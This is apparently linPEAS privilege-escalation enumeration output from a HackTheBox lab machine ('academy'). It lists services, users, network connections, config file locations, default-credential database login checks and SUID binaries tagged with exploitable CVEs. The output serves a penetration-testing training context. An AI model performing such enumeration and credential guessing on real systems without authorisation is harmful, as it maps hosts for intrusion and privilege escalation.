/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
/lib/systemd/system/systemd-udevd.service is executing some relative path
/lib/systemd/system/systemd-udev-settle.service is executing some relative path
/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
/lib/systemd/system/udev.service is executing some relative path
/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
/usr/lib/systemd/system/atd.service is executing some relative path
/usr/lib/systemd/system/initrd-cleanup.service is executing some relative path
/usr/lib/systemd/system/initrd-parse-etc.service is executing some relative path
/usr/lib/systemd/system/initrd-switch-root.service is executing some relative path
/usr/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
/usr/lib/systemd/system/mdmonitor-oneshot.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
/usr/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
/usr/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
/usr/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
/usr/lib/systemd/system/systemd-halt.service is executing some relative path
/usr/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
/usr/lib/systemd/system/systemd-journal-flush.service is executing some relative path
/usr/lib/systemd/system/systemd-kexec.service is executing some relative path
/usr/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
/usr/lib/systemd/system/systemd-sysusers.service is executing some relative path
/usr/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
/usr/lib/systemd/system/systemd-udevd.service is executing some relative path
/usr/lib/systemd/system/systemd-udev-settle.service is executing some relative path
/usr/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
/usr/lib/systemd/system/udev.service is executing some relative path
/usr/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
/usr/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                       
NEXT                        LEFT          LAST                        PASSED             UNIT                         ACTIVATES                                                                              
Mon 2020-11-16 20:09:00 UTC 16min left    Mon 2020-11-16 19:39:16 UTC 13min ago          phpsessionclean.timer        phpsessionclean.service       
Tue 2020-11-17 00:00:00 UTC 4h 7min left  Mon 2020-11-16 18:54:40 UTC 58min ago          logrotate.timer              logrotate.service             
Tue 2020-11-17 00:00:00 UTC 4h 7min left  Mon 2020-11-16 18:54:40 UTC 58min ago          man-db.timer                 man-db.service                
Tue 2020-11-17 01:14:05 UTC 5h 21min left Thu 2020-11-05 12:53:43 UTC 1 weeks 4 days ago fwupd-refresh.timer          fwupd-refresh.service         
Tue 2020-11-17 01:16:47 UTC 5h 23min left Thu 2020-11-05 12:53:55 UTC 1 weeks 4 days ago motd-news.timer              motd-news.service             
Tue 2020-11-17 03:03:13 UTC 7h left       Thu 2020-11-05 12:54:31 UTC 1 weeks 4 days ago apt-daily.timer              apt-daily.service             
Tue 2020-11-17 06:12:19 UTC 10h left      Mon 2020-11-16 19:30:55 UTC 21min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2020-11-17 19:09:42 UTC 23h left      Mon 2020-11-16 19:09:42 UTC 43min ago          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2020-11-22 03:10:36 UTC 5 days left   Mon 2020-11-16 18:54:40 UTC 58min ago          e2scrub_all.timer            e2scrub_all.service           
Mon 2020-11-23 00:00:00 UTC 6 days left   Mon 2020-11-16 18:54:40 UTC 58min ago          fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a                snapd.snap-repair.timer      snapd.snap-repair.service     

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                       
                                                                                                                                                                                                             
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                      
                                                                                                                                                                                                             
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                      
Socket /run/user/1002/snapd-session-agent.socket owned by cry0l1t3 uses HTTP. Response to /index:                                                                                                            
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                                                        
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)                                                                                       

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                                                        
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                                                                           
:1.0                            402 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
:1.1                            586 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
:1.12                          2149 systemd         cry0l1t3         :1.12         user@1002.service           -       -
:1.144                        19429 busctl          cry0l1t3         :1.144        session-14.scope            14      -
:1.2                            587 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -
:1.4                            797 networkd-dispat root             :1.4          networkd-dispatcher.service -       -
:1.5                            765 accounts-daemon root             :1.5          accounts-daemon.service     -       -
:1.6                              1 systemd         root             :1.6          init.scope                  -       -
:1.7                            822 systemd-logind  root             :1.7          systemd-logind.service      -       -
:1.8                            981 polkitd         root             :1.8          polkit.service              -       -
:1.9                            987 unattended-upgr root             :1.9          unattended-upgrades.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
org.freedesktop.Accounts        765 accounts-daemon root             :1.5          accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      981 polkitd         root             :1.8          polkit.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          822 systemd-logind  root             :1.7          systemd-logind.service      -       -
org.freedesktop.network1        402 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
org.freedesktop.resolve1        586 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.6          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       587 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                                                                  
academy                                                                                                                                                                                                      
127.0.0.1 localhost
127.0.1.1 academy
127.0.1.1 academy.htb dev-staging-01.academy.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                                                                                                                                                    
                                                                                                                                                                                                             
[+] Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                          
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.215  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:2680  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:2680  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:26:80  txqueuelen 1000  (Ethernet)
        RX packets 2563  bytes 516616 (516.6 KB)
        RX errors 0  dropped 17  overruns 0  frame 0
        TX packets 1510  bytes 547376 (547.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 9406  bytes 668482 (668.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9406  bytes 668482 (668.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[+] Networks and neighbours
Kernel IP routing table                                                                                                                                                                                      
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens160
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
Address                  HWtype  HWaddress           Flags Mask            Iface
_gateway                 ether   00:50:56:b9:33:6f   C                     ens160

[+] Iptables rules
iptables rules Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                   
Active Internet connections (servers and established)                                                                                                                                                        
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0   9792 10.10.10.215:22         10.10.14.38:57018       ESTABLISHED -                   
tcp        0      0 10.10.10.215:47402      10.10.14.38:5555        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   

[+] Can I sniff with tcpdump?
No                                                                                                                                                                                                           
                                                                                                                                                                                                             
[+] Internet Access?
icmp is not available                                                                                                                                                                                        
Port 443 is not accessible
Port 80 is not accessible


====================================( Users Information )=====================================
[+] My user                                                                                                                                                                                                  
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                        
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)                                                                                                                                           

[+] Do I have PGP keys?
                                                                                                                                                                                                             
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                
Sorry, try again.                                                                                                                                                                                            

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                                                                                                        
gdb wasn't found in PATH

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                      
                                                                                                                                                                                                             
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                            
                                                                                                                                                                                                             
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                              

[+] Users with console
21y4d:x:1003:1003::/home/21y4d:/bin/sh                                                                                                                                                                       
ch4p:x:1004:1004::/home/ch4p:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
g0blin:x:1005:1005::/home/g0blin:/bin/sh
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                       
uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
uid=1003(21y4d) gid=1003(21y4d) groups=1003(21y4d)
uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p)
uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(mysql) gid=120(mysql) groups=120(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 19:55:11 up  1:00,  1 user,  load average: 0.21, 0.20, 0.09                                                                                                                                                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cry0l1t3 pts/0    10.10.14.38      19:27    2:45   0.04s  0.00s w

[+] Last logons
egre55   pts/0        10.10.14.2       Sat Aug  8 18:55 - 21:15  (02:19)                                                                                                                                     
root     tty1                          Sat Aug  8 18:52 - down   (03:05)
reboot   system boot  5.4.0-42-generic Sat Aug  8 18:51 - 21:58  (03:06)
egre55   pts/0        10.10.14.2       Fri Aug  7 14:38 - 16:44  (02:05)
egre55   tty1                          Fri Aug  7 14:24 - down   (02:19)
reboot   system boot  5.4.0-42-generic Fri Aug  7 14:22 - 16:44  (02:21)
egre55   tty1                          Fri Aug  7 12:13 - down   (02:08)
reboot   system boot  5.4.0-26-generic Fri Aug  7 12:10 - 14:21  (02:11)

wtmp begins Fri Aug  7 12:10:03 2020

[+] Last time logon each user
Username         Port     From             Latest                                                                                                                                                            
root             tty1                      Mon Nov  9 10:11:49 +0000 2020
egre55           pts/0    10.10.14.6       Fri Nov  6 09:52:43 +0000 2020
mrb3n            pts/0    10.10.14.5       Wed Oct 21 10:55:11 +0000 2020
cry0l1t3         pts/0    10.10.14.38      Mon Nov 16 19:27:51 +0000 2020
root             tty1                      Mon Nov  9 10:11:49 +0000 2020

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                                                                        
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                                                                            
mysql  Ver 8.0.22-0ubuntu0.20.04.2 for Linux on x86_64 ((Ubuntu))                                                                                                                                            

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                                                                  
[+] MySQL connection using root/NOPASS ................. No                                                                                                                                                  
[+] Searching mysql credentials and exec                                                                                                                                                                     
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                                              
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                                                                     
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                                                                     
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                     
                                                                                                                                                                                                             
[+] Apache server info
Version: Server version: Apache/2.4.41 (Ubuntu)                                                                                                                                                              
Server built:   2020-08-12T19:46:17
/etc/apache2/sites-enabled/laravel.conf:     ServerName dev-staging-01.academy.htb
/etc/apache2/sites-enabled/laravel.conf:     ServerName academy.htb
PHP exec extensions
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Searching Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                                                                      
                                                                                                                                                                                                             
[+] Searching Drupal settings.php files
/default/settings.php Not Found                                                                                                                                                                              
                                                                                                                                                                                                             
[+] Searching Tomcat users file
tomcat-users.xml Not Found                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Mongo information
mongo binary Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Searching supervisord configuration file
supervisord.conf Not Found                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Searching cesi configuration file
cesi.conf Not Found                                                                                                                                                                                          
                                                                                                                                                                                                             
[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                                    
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Searching Hostapd config file
hostapd.conf Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Searching wifi conns file
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                                                                    
                                                                                                                                                                                                             
[+] Searching .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Searching ldap directories and their hashes
/etc/ldap                                                                                                                                                                                                    
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found                                                                                                                                                                                              
                                                                                                                                                                                                             
[+] Searching ssl/ssh files
ChallengeResponseAuthentication no                                                                                                                                                                           
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found (out limited):
/var/lib/fwupd/pki/client.pem
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.crt
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.crt
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.crt
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.crt
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.crt
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.crt
/var/www/html/htb-academy-dev-01/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.crt
/etc/apache2/sites-enabled
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket
/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem
/usr/src/linux-headers-5.4.0-52/scripts/kconfig/tests/no_write_if_dep_unmet/config

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                                                                           
                                                                                                                                                                                                             
[+] Searching Cloud credentials (AWS, Azure, GC)
                                                                                                                                                                                                             
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                                                                       
/etc/exports Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                                                                        
krb5.conf Not Found                                                                                                                                                                                          
tickets kerberos Not Found                                                                                                                                                                                   
klist Not Found                                                                                                                                                                                              
                                                                                                                                                                                                             
[+] Searching Kibana yaml
kibana.yml Not Found                                                                                                                                                                                         
                                                                                                                                                                                                             
[+] Searching Knock configuration
Knock.config Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Searching logstash files
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Searching elasticsearch files
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Searching AD cached hashes
cached hashes Not Found                                                                                                                                                                                      
                                                                                                                                                                                                             
[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                                                          
No Sockets found in /run/screen/S-cry0l1t3.                                                                                                                                                                  

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                                                          
tmux Not Found                                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Searching Couchdb directory
                                                                                                                                                                                                             
[+] Searching redis.conf
                                                                                                                                                                                                             
[+] Searching dovecot files
dovecot credentials Not Found                                                                                                                                                                                
                                                                                                                                                                                                             
[+] Searching mosquitto.conf
                                                                                                                                                                                                             
[+] Searching neo4j auth file
                                                                                                                                                                                                             
[+] Searching Cloud-Init conf file
                                                                                                                                                                                                             
[+] Searching Erlang cookie file
                                                                                                                                                                                                             
[+] Searching GVM auth file
                                                                                                                                                                                                             
[+] Searching IPSEC files
                                                                                                                                                                                                             
[+] Searching IRSSI files
                                                                                                                                                                                                             
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings                                                                                                                                                                          
/usr/share/keyrings:
total 32
-rw-r--r-- 1 root root 2236 Mar 30  2020 ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Mar 30  2020 ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root    0 Jan 17  2018 ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 ubuntu-master-keyring.gpg

[+] Searching Filezilla sites file
                                                                                                                                                                                                             
[+] Searching backup-manager files
backup-manager file: /var/www/html/academy/config/database.php                                                                                                                                               
backup-manager file: /var/www/html/htb-academy-dev-01/config/database.php

[+] Searching uncommon passwd files (splunk)
                                                                                                                                                                                                             

====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                                     
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /snap/core18/1705/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/1705/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/1705/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1705/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1705/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1705/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1705/bin/su
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/1705/bin/ping
-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root             23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root   root             27K Jan  8  2020 /snap/core18/1705/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Jan  8  2020 /snap/core18/1705/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /snap/core18/1705/usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root            109K Apr 10  2020 /snap/snapd/7264/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             67K May 28 06:37 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             44K May 28 06:37 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             87K May 28 06:37 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             52K May 28 06:37 /usr/bin/chsh
-rwsr-xr-x 1 root   root             84K May 28 06:37 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root            463K May 29 07:37 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root   messagebus       51K Jun 11 18:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            163K Jul 15 00:17 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root             39K Jul 21 07:49 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             67K Jul 21 07:49 /usr/bin/su
-rwsr-xr-x 1 root   root             55K Jul 21 07:49 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
